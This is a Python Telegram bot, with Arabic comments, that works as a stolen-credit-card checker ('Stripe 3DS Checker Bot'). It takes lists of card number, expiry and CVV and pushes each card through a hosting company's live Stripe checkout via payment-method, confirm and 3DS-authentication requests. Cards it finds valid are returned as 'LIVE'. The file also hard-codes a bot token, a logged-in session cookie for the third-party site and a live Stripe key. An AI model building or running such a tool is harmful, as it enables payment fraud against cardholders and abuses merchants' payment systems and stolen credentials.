#pylint:disable=W0603
#pylint:disable=W0611
import telebot
from telebot import types
import requests
from bs4 import BeautifulSoup
import urllib3
import re
import time
from typing import Dict, List
import threading

# إخفاء تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# بيانات البوت
TOKEN = "8166484030:AAGiBsKby2GF0ykoxvkKMHCu80lHUIfD6xg"
ADMIN_ID = 5895491379

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# تخزين البيانات
user_cards = {}
checking_status = {}

# ألوان للطباعة (للاختبار المحلي)
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
WHITE = "\033[97m"
RESET = "\033[0m"

# فحص Luhn Algorithm
def luhn_check(card_number):
    digits = [int(d) for d in card_number if d.isdigit()]
    checksum = sum(digits[-1::-2]) + sum(sum(divmod(d * 2, 10)) for d in digits[-2::-2])
    return checksum % 10 == 0

# فحص BIN (Visa: يبدأ بـ 4، MasterCard: يبدأ بـ 51-55)
def is_valid_bin(card_number):
    bin = card_number[:6]
    return bin.startswith('4') or bin.startswith(('51', '52', '53', '54', '55'))

# كلاس لفحص الكروت باستخدام Stripe
class StripeChecker:
    def __init__(self, invoice_id):
        self.invoice_id = invoice_id
        self.session_id = None
        self.total_amount = None
        self.stripe_mid = None
        self.stripe_sid = None

    def fetch_invoice_data(self) -> tuple:
        url = f"https://vsys.host/viewinvoice.php?id={self.invoice_id}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Dest': 'document',
        }
        cookies = {
            'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
            'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
            '_ga': 'GA1.1.1641871625.1761294273',
            '_gcl_au': '1.1.1086970495.1761294272',
            'VsysFirstVisit': '1761302393',
            '_ga_248YG9EFT7': 'GS2.1.s1761302293$o3$g1$t1761302439$j48$l1$h530568902',
        }
        try:
            session = requests.Session()
            response = session.get(url, headers=headers, cookies=cookies, timeout=20, verify=False)
            response.raise_for_status()
            
            new_cookies = session.cookies.get_dict()
            self.stripe_mid = new_cookies.get('__stripe_mid', '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02')
            self.stripe_sid = new_cookies.get('__stripe_sid', '2a9c20ed-7d36-46e6-9b81-95addca2ce147b8f82')
            
            soup = BeautifulSoup(response.text, 'html.parser')
            m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', response.text, flags=re.IGNORECASE)
            self.session_id = m.group(0).split('/pay/')[1].split('#')[0] if m and '/pay/' in m.group(0) else ''
            
            total_row = soup.find('tr', class_='total-row') or soup.select_one('tr:contains("Total")')
            if not total_row:
                return False, "لم يتم العثور على المبلغ الإجمالي"
            total_amount_text = total_row.find_all('td')[1].text.replace('$', '').strip()
            self.total_amount = int(float(total_amount_text) * 100) if total_amount_text else 0
            
            if not self.session_id or not self.total_amount:
                return False, "فشل جلب session_id أو المبلغ"
            
            return True, None
        except Exception as e:
            return False, f"خطأ في جلب بيانات الفاتورة: {str(e)[:50]}"

    def check_card(self, card: Dict, retry_count: int = 0) -> Dict:
        start_time = time.time()
        
        if not luhn_check(card['number']):
            return {
                'status': 'ERROR',
                'message': 'Invalid card number (Luhn check failed)',
                'details': {'status_3ds': 'N/A'},
                'time': round(time.time() - start_time, 2)
            }

        if not is_valid_bin(card['number']):
            return {
                'status': 'DECLINED',
                'message': '❌ Unsupported card type (BIN not Visa/MasterCard)',
                'details': {'status_3ds': 'N/A'},
                'time': round(time.time() - start_time, 2)
            }

        success, error = self.fetch_invoice_data()
        if not success:
            if retry_count < 2:
                time.sleep(2)
                return self.check_card(card, retry_count + 1)
            return {
                'status': 'ERROR',
                'message': f'Failed to fetch invoice data: {error}',
                'details': {'status_3ds': 'N/A'},
                'time': round(time.time() - start_time, 2)
            }

        try:
            headers = {
                'accept': 'application/json',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://checkout.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://checkout.stripe.com/',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="133", "Google Chrome";v="133"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
            }

            data_pm = (
                f'type=card&card[number]={card["number"]}&card[cvc]={card["cvv"]}&'
                f'card[exp_month]={card["month"]}&card[exp_year]={card["year"]}&'
                'billing_details[name]=Card+details+saad&'
                'billing_details[email]=renes98352%40neuraxo.com&'
                'billing_details[address][country]=IT&'
                'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
                f'muid={self.stripe_mid}&'
                f'sid={self.stripe_sid}&'
                'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
                'payment_user_agent=stripe.js%2F6440ee8f22%3B+stripe-js-v3%2F6440ee8f22%3B+checkout&'
                'client_attribution_metadata[client_session_id]=29bc83c3-2537-4d89-bedb-03ada15d3144&'
                f'client_attribution_metadata[checkout_session_id]={self.session_id}&'
                'client_attribution_metadata[merchant_integration_source]=checkout&'
                'client_attribution_metadata[merchant_integration_version]=hosted_checkout&'
                'client_attribution_metadata[payment_method_selection_flow]=automatic&'
                'client_attribution_metadata[checkout_config_id]=52d1dd75-f056-4477-95cc-a57669140703'
            )

            r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data_pm, timeout=20)
            pm_res = r1.json()

            if 'id' not in pm_res:
                error_msg = pm_res.get('error', {}).get('message', 'خطأ غير معروف')
                return {
                    'status': 'ERROR',
                    'message': f'Failed to create PM: {error_msg}',
                    'details': {'status_3ds': 'N/A'},
                    'time': round(time.time() - start_time, 2)
                }

            pm_id = pm_res['id']

            data_confirm = (
                f'eid=NA&payment_method={pm_id}&expected_amount={self.total_amount}&'
                f'last_displayed_line_item_group_details[subtotal]={self.total_amount}&'
                'last_displayed_line_item_group_details[total_exclusive_tax]=0&'
                'last_displayed_line_item_group_details[total_inclusive_tax]=0&'
                'last_displayed_line_item_group_details[total_discount_amount]=0&'
                'last_displayed_line_item_group_details[shipping_rate_amount]=0&'
                'expected_payment_method_type=card&'
                'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
                f'muid={self.stripe_mid}&'
                f'sid={self.stripe_sid}&'
                'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
                'version=6440ee8f22&init_checksum=5tCZxAHSQW2HZsEpFgsH5M3JqPNl7lPM&'
                'js_checksum=qto~d%5En0%3DQU%3Eazbu%5Db%5EbUTdPU~a_eToS%60%3DeP%7B%25%5E%3D%3F%24n%3CQ%5B%5E%5Eo%3FU%5E%60w&'
                'client_attribution_metadata[client_session_id]=29bc83c3-2537-4d89-bedb-03ada15d3144&'
                f'client_attribution_metadata[checkout_session_id]={self.session_id}&'
                'client_attribution_metadata[merchant_integration_source]=checkout&'
                'client_attribution_metadata[merchant_integration_version]=hosted_checkout&'
                'client_attribution_metadata[payment_method_selection_flow]=automatic&'
                'client_attribution_metadata[checkout_config_id]=52d1dd75-f056-4477-95cc-a57669140703'
            )

            r2 = requests.post(
                f'https://api.stripe.com/v1/payment_pages/{self.session_id}/confirm',
                headers=headers, data=data_confirm, timeout=20
            )
            confirm_res = r2.json()

            if 'payment_intent' not in confirm_res:
                if retry_count < 1:
                    time.sleep(5)
                    return self.check_card(card, retry_count + 1)
                return {
                    'status': 'ERROR',
                    'message': 'No payment intent found',
                    'details': {'status_3ds': 'N/A'},
                    'time': round(time.time() - start_time, 2)
                }

            pi = confirm_res['payment_intent']
            status = pi.get('status', 'unknown')

            if status == 'requires_action':
                next_action = pi.get('next_action', {})
                if next_action.get('type') == 'use_stripe_sdk':
                    use_stripe_sdk = next_action.get('use_stripe_sdk', {})
                    source_id = use_stripe_sdk.get('three_d_secure_2_source')

                    if not source_id:
                        return {
                            'status': 'ERROR',
                            'message': 'No 3DS source found',
                            'details': {'status_3ds': 'N/A'},
                            'time': round(time.time() - start_time, 2)
                        }

                    data_3ds = (
                        f'source={source_id}&'
                        'browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.6793.65+Safari%2F537.36%22%7D&'
                        'one_click_authn_device_support[hosted]=false&'
                        'one_click_authn_device_support[same_origin_frame]=false&'
                        'one_click_authn_device_support[spc_eligible]=true&'
                        'one_click_authn_device_support[webauthn_eligible]=true&'
                        'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                    )

                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data_3ds, timeout=20)
                    tds_res = r3.json()

                    trans_status = tds_res.get('ares', {}).get('transStatus', '?')
                    details = {'status_3ds': trans_status}

                    if trans_status == 'N':
                        return {
                            'status': 'LIVE',
                            'message': '✅ Live - transStatus: N',
                            'details': details,
                            'time': round(time.time() - start_time, 2)
                        }
                    elif trans_status == 'R':
                        return {
                            'status': 'DECLINED',
                            'message': '❌ Rejected - transStatus: R',
                            'details': details,
                            'time': round(time.time() - start_time, 2)
                        }
                    elif trans_status == 'C':
                        return {
                            'status': 'OTP',
                            'message': '🔐 Challenge - transStatus: C',
                            'details': details,
                            'time': round(time.time() - start_time, 2)
                        }
                    elif trans_status == 'Y':
                        return {
                            'status': 'LIVE',
                            'message': '✅ Approved - transStatus: Y',
                            'details': details,
                            'time': round(time.time() - start_time, 2)
                        }
                    else:
                        return {
                            'status': 'ERROR',
                            'message': f'❔ Unknown transStatus: {trans_status}',
                            'details': details,
                            'time': round(time.time() - start_time, 2)
                        }
                else:
                    return {
                        'status': 'ERROR',
                        'message': f'Next action: {next_action.get("type", "unknown")}',
                        'details': {'status_3ds': 'N/A'},
                        'time': round(time.time() - start_time, 2)
                    }
            elif status == 'succeeded':
                return {
                    'status': 'LIVE',
                    'message': '✅ Approved Direct',
                    'details': {'status_3ds': 'N/A'},
                    'time': round(time.time() - start_time, 2)
                }
            else:
                error = pi.get('last_payment_error', {})
                error_msg = error.get('message', error.get('code', status))
                return {
                    'status': 'ERROR',
                    'message': f'❌ {error_msg}',
                    'details': {'status_3ds': 'N/A'},
                    'time': round(time.time() - start_time, 2)
                }
        except Exception as e:
            if retry_count < 1:
                time.sleep(2)
                return self.check_card(card, retry_count + 1)
            return {
                'status': 'ERROR',
                'message': f'Error: {str(e)[:50]}',
                'details': {'status_3ds': 'N/A'},
                'time': round(time.time() - start_time, 2)
            }

# Bot Handlers
@bot.message_handler(commands=['start'])
def start_message(message):
    username = message.from_user.first_name or "User"
    welcome_text = f"""<b>🎉 Welcome {username}!

🔥 Stripe 3DS Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results  
🔒 Secure Processing
💳 Only LIVE Cards Sent

📤 Send invoice ID and combo file or card details to start checking!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode("utf-8").splitlines()
        
        cards = []
        invoice_id = None
        for line in lines:
            line = line.strip()
            if line.isdigit() and len(line) >= 6:  # Assuming invoice ID is a number with at least 6 digits
                invoice_id = line
            elif '|' in line and len(line.split('|')) == 4:
                parts = line.split('|')
                cards.append({
                    'number': parts[0].strip(),
                    'month': parts[1].strip().zfill(2),
                    'year': parts[2].strip(),
                    'cvv': parts[3].strip(),
                    'raw': line
                })
        
        if not invoice_id:
            bot.reply_to(message, "❌ No invoice ID found in file!")
            return
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file!")
            return
        
        user_cards[user_id] = {'invoice_id': invoice_id, 'cards': cards}
        checking_status[user_id] = False
        
        cc_count = len(cards)
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
📄 Invoice ID: {invoice_id}
🔥 Gateway: Stripe 3DS
⚡ Status: Ready

Click below to start checking:
</b>""",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    text = message.text.strip()
    parts = text.split('\n')
    invoice_id = None
    card = None
    
    if len(parts) >= 2:
        if parts[0].isdigit() and len(parts[0]) >= 6:
            invoice_id = parts[0]
            if '|' in parts[1] and len(parts[1].split('|')) == 4:
                card_parts = parts[1].split('|')
                card = {
                    'number': card_parts[0].strip(),
                    'month': card_parts[1].strip().zfill(2),
                    'year': card_parts[2].strip(),
                    'cvv': card_parts[3].strip(),
                    'raw': parts[1]
                }
    
    if invoice_id and card:
        user_cards[message.from_user.id] = {'invoice_id': invoice_id, 'cards': [card]}
        checking_status[message.from_user.id] = False
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded!
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card_parts[0][:6]}...{card_parts[0][-4:]}</code>
📄 Invoice ID: {invoice_id}
🔥 Gateway: Stripe 3DS
⚡ Status: Ready
</b>""",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!
Use: 
InvoiceID
Card|MM|YYYY|CVV
Example:
260528
5127740082586858|11|2028|155
</b>""")

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_checking(call):
    user_id = call.from_user.id
    
    if user_id not in user_cards or not user_cards[user_id]['cards']:
        bot.answer_callback_query(call.id, "❌ No cards or invoice ID loaded!")
        return
    
    if checking_status.get(user_id, False):
        bot.answer_callback_query(call.id, "⚠️ Already checking!")
        return
    
    checking_status[user_id] = True
    bot.answer_callback_query(call.id, "✅ Starting check...")
    
    thread = threading.Thread(target=check_cards_thread, args=(user_id, call.message))
    thread.start()

def check_cards_thread(user_id, message):
    data = user_cards[user_id]
    cards = data['cards']
    invoice_id = data['invoice_id']
    total = len(cards)
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text="⏳ Initializing checker...\n🔑 Getting invoice data..."
    )
    
    checker = StripeChecker(invoice_id)
    live = otp = declined = errors = checked = key_attempts = na_count = 0
    wait_time = 60  # بداية الانتظار بدقيقة
    start_time = time.time()
    
    for card in cards:
        if not checking_status.get(user_id, True):
            break
        
        checked += 1
        result = checker.check_card(card)
        key_attempts += 1
        
        status_3ds = result.get('details', {}).get('status_3ds', 'N/A')
        if status_3ds == 'N/A':
            na_count += 1
        else:
            na_count = 0
        
        if na_count >= 5:
            if wait_time > 3600:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    text=f"""<b>⚠️ Checking Stopped!
━━━━━━━━━━━━━━━━━━━━
📊 Reason: Max wait time reached (1 hour) with repeated N/A statuses
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
                )
                checking_status[user_id] = False
                return
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.message_id,
                text=f"""<b>🔥 Gateway: Stripe 3DS
━━━━━━━━━━━━━━━━━━━━
⏳ Paused due to {na_count} consecutive N/A statuses...
⏱ Waiting: {wait_time} seconds
</b>"""
            )
            time.sleep(wait_time)
            wait_time *= 1
            na_count = 0
        
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        callback_data = f"show_result_{checked}"
        keyboard.add(
            types.InlineKeyboardButton(f"📋|Status: {status_3ds}", callback_data=callback_data)
        )
        keyboard.add(
            types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• OTP 🔐 ➜ [{otp}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Key Attempts 🔑 ➜ [{key_attempts}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• N/A Count ❔ ➜ [{na_count}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Wait Time ⏱ ➜ [{wait_time}s] •", callback_data='x'),
            types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
        )
        
        if result['status'] == 'LIVE':
            live += 1
            details = result['details']
            msg = f"""<b>✅ LIVE CARD
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result['message']}
⏱ Time: {result['time']} sec
🔒 3DS Status: {details['status_3ds']}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
            bot.send_message(user_id, msg)
        elif result['status'] == 'OTP':
            otp += 1
        elif result['status'] == 'DECLINED':
            declined += 1
            time.sleep(5)
        else:
            errors += 1
            time.sleep(5)
        
        user_cards[user_id]['cards'][checked-1]['result'] = result
        
        progress = int((checked / total) * 20)
        progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
        elapsed = time.time() - start_time
        speed = checked / elapsed if elapsed > 0 else 0
        eta = (total - checked) / speed if speed > 0 else 0
        
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.message_id,
                text=f"""<b>🔥 Gateway: Stripe 3DS
━━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
💳 Current: {card['number'][:6]}...{card['number'][-4:]}
📄 Invoice ID: {invoice_id}
🔑 Key Attempts: {key_attempts}
❔ N/A Count: {na_count}
⏱ Wait Time: {wait_time}s
</b>""",
                reply_markup=keyboard
            )
        except:
            pass
        
        time.sleep(2)
    
    total_time = time.time() - start_time
    error_reason = "Completed successfully"
    if not checking_status.get(user_id, True):
        error_reason = "Stopped by user"
    elif na_count >= 5 and wait_time > 3600:
        error_reason = "Stopped due to repeated N/A statuses after max wait time"
    elif errors > 0 and checked < total:
        error_reason = "Stopped due to repeated errors or invalid keys"
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text=f"""<b>✅ CHECKING COMPLETED!
━━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
├ Total Cards: {total}
├ LIVE ✅: {live}
├ OTP 🔐: {otp}
├ Declined ❌: {declined}
├ Errors ⚠️: {errors}
├ Key Attempts 🔑: {key_attempts}
├ Max N/A Count ❔: {na_count}
├ Max Wait Time ⏱: {wait_time}s
├ Reason: {error_reason}

⏱ Stats:
├ Time: {int(total_time)}s
└ Speed: {(total/total_time):.2f} cards/sec
━━━━━━━━━━━━━━━━━━━━
🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    )
    
    checking_status[user_id] = False
    del user_cards[user_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith('show_result_'))
def show_card_result(call):
    user_id = call.from_user.id
    index = int(call.data.split('_')[-1]) - 1
    
    if user_id not in user_cards or index >= len(user_cards[user_id]['cards']):
        bot.answer_callback_query(call.id, "❌ No result found!")
        return
    
    card = user_cards[user_id]['cards'][index]
    result = card.get('result', {})
    details = result.get('details', {})
    
    msg = f"""<b>{result.get('message', '❔ Unknown Status')}
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result.get('message', 'Unknown')}
⏱ Time: {result.get('time', 0)} sec
🔒 3DS Status: {details.get('status_3ds', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    
    bot.send_message(user_id, msg)
    bot.answer_callback_query(call.id, "📋 Result displayed!")

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_checking(call):
    user_id = call.from_user.id
    checking_status[user_id] = False
    bot.answer_callback_query(call.id, "✅ Checking stopped!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status")

@bot.message_handler(commands=['help'])
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:
━━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this message
/status - Check bot status

📤 How to use:
1. Send invoice ID and combo file or card details
2. Click "Start Checking"
3. Only LIVE cards sent, others via button

📝 Combo Format:
InvoiceID
Card|MM|YYYY|CVV

Example:
260528
5127740082586858|11|2028|155
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['status'])
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE
━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: Stripe 3DS
🔥 Speed: Ultra Fast
✅ Accuracy: High
🌍 Server: Active
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, status_text)

if __name__ == "__main__":
    print("🚀 Starting Stripe Checker Bot...")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print("✅ Bot is running...\n")
    bot.polling(none_stop=True)
